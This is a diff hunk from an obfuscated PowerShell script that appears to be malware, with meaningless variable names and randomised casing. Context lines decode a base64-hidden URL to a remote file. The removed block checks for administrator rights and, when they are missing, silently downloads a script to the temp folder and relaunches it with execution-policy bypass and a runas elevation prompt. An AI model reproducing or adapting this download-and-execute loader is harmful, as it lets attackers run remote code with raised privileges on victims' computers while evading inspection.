@@ -4,15 +4,6 @@ $SD="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FvZGZzLzAvbWFpbi9maWxlLmljbw"
 $GJ="em";
 $odb4=[System.Convert]::FromBase64String($gtr+"=");
 $dsfgq=[System.Text.Encoding]::UTF8.GetString($odb4);
-$A=[Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent());
-if(-not $A.IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){
-    $ja0s = [System.IO.Path]::GetTempPath();
-    $kds=Join-Path -Path $ja0s -ChildPath "finished.ps1";
-    inVOkE-wEbreQUEst -uRI $dsfgq -ouTfIle $kds -eRRoRactIoN sIlentLycOntInuE;
-    $B=[System.Diagnostics.Process]::Start("powershell.exe","-nOpROfIle -exEcUtIonpolIcy bypaSS -fIle `""+$kds+"`" -veRb ruNas");
-    $B.WaitForExit();
-    exit;
-}
 $FG="C";
 $DF=":";
 $DSF="V";
